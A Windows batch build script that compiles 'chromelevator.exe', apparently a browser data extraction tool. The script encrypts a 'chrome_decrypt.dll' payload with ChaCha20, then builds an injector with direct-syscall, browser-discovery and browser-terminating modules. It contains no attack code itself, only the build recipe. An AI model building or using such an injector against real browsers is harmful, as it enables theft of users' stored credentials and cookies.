@echo off
set LOG=C:\Tools\cabe\finish.log
echo === FINISH START === > %LOG%

set "VCTOOLS=C:\Program Files (x86)\Microsoft Visual Studio\2022\BuildTools\VC\Tools\MSVC\14.44.35207"
set "WINSDK=C:\Program Files (x86)\Windows Kits\10"
set "SDKVER=10.0.26100.0"
set "PATH=%VCTOOLS%\bin\Hostx64\x64;%WINSDK%\bin\%SDKVER%\x64;%PATH%"
set "INCLUDE=%VCTOOLS%\include;%WINSDK%\Include\%SDKVER%\ucrt;%WINSDK%\Include\%SDKVER%\shared;%WINSDK%\Include\%SDKVER%\um;%WINSDK%\Include\%SDKVER%\winrt;%WINSDK%\Include\%SDKVER%\cppwinrt"
set "LIB=%VCTOOLS%\lib\x64;%WINSDK%\Lib\%SDKVER%\ucrt\x64;%WINSDK%\Lib\%SDKVER%\um\x64"

cd /d C:\Tools\cabe

echo --- chacha20 obj --- >> %LOG%
cl /nologo /W3 /WX- /O1 /Os /MT /GS- /Gy /GR- /Gw /Zc:threadSafeInit- /utf-8 /std:c++17 /EHsc /c src\crypto\chacha20.cpp /Fo"build\chacha20.obj" >> %LOG% 2>&1

echo --- encryptor --- >> %LOG%
cl /nologo /W3 /WX- /O1 /Os /MT /GS- /Gy /GR- /Gw /Zc:threadSafeInit- /utf-8 /std:c++17 /EHsc /Fe"build\encryptor.exe" src\tools\encryptor.cpp build\chacha20.obj /link /NOLOGO /OPT:NOREF /OPT:NOICF /DYNAMICBASE /NXCOMPAT /INCREMENTAL:NO bcrypt.lib >> %LOG% 2>&1

echo --- encrypt payload (retry loop) --- >> %LOG%
set TRY=0
:retry
set /a TRY=%TRY%+1
build\encryptor.exe build\chrome_decrypt.dll build\chrome_decrypt.enc build\payload_data.hpp >> %LOG% 2>&1
if exist build\payload_data.hpp goto enc_ok
echo attempt %TRY% failed, waiting 5s... >> %LOG%
timeout /t 5 /nobreak >nul
if %TRY% lss 6 goto retry
echo ENCRYPT FAILED AFTER 6 TRIES >> %LOG%
goto :eof
:enc_ok
echo encrypted ok on attempt %TRY% >> %LOG%

echo --- injector compile --- >> %LOG%
ml64.exe /nologo /c /Fo"build\syscall_trampoline.obj" src\sys\syscall_trampoline_x64.asm >> %LOG% 2>&1
cl /nologo /W3 /WX- /O1 /Os /MT /GS- /Gy /GR- /Gw /Zc:threadSafeInit- /utf-8 /std:c++17 /EHsc /I"build" /c src\injector\injector_main.cpp /Fo"build\injector_main.obj" >> %LOG% 2>&1
cl /nologo /W3 /WX- /O1 /Os /MT /GS- /Gy /GR- /Gw /Zc:threadSafeInit- /utf-8 /std:c++17 /EHsc /I"build" /c src\injector\browser_discovery.cpp /Fo"build\browser_discovery.obj" >> %LOG% 2>&1
cl /nologo /W3 /WX- /O1 /Os /MT /GS- /Gy /GR- /Gw /Zc:threadSafeInit- /utf-8 /std:c++17 /EHsc /I"build" /c src\injector\browser_terminator.cpp /Fo"build\browser_terminator.obj" >> %LOG% 2>&1
cl /nologo /W3 /WX- /O1 /Os /MT /GS- /Gy /GR- /Gw /Zc:threadSafeInit- /utf-8 /std:c++17 /EHsc /I"build" /c src\injector\process_manager.cpp /Fo"build\process_manager.obj" >> %LOG% 2>&1
cl /nologo /W3 /WX- /O1 /Os /MT /GS- /Gy /GR- /Gw /Zc:threadSafeInit- /utf-8 /std:c++17 /EHsc /I"build" /c src\injector\pipe_server.cpp /Fo"build\pipe_server.obj" >> %LOG% 2>&1
cl /nologo /W3 /WX- /O1 /Os /MT /GS- /Gy /GR- /Gw /Zc:threadSafeInit- /utf-8 /std:c++17 /EHsc /I"build" /c src\injector\injector.cpp /Fo"build\injector.obj" >> %LOG% 2>&1
cl /nologo /W3 /WX- /O1 /Os /MT /GS- /Gy /GR- /Gw /Zc:threadSafeInit- /utf-8 /std:c++17 /EHsc /I"build" /c src\sys\internal_api.cpp /Fo"build\internal_api.obj" >> %LOG% 2>&1

echo --- link --- >> %LOG%
link /NOLOGO /OPT:NOREF /OPT:NOICF /DYNAMICBASE /NXCOMPAT /INCREMENTAL:NO /OUT:chromelevator.exe build\injector_main.obj build\browser_discovery.obj build\browser_terminator.obj build\process_manager.obj build\pipe_server.obj build\injector.obj build\internal_api.obj build\chacha20.obj build\syscall_trampoline.obj version.lib shell32.lib advapi32.lib user32.lib bcrypt.lib >> %LOG% 2>&1
echo === LINK EXIT %ERRORLEVEL% === >> %LOG%
dir chromelevator.exe >> %LOG% 2>&1
dir build >> %LOG% 2>&1
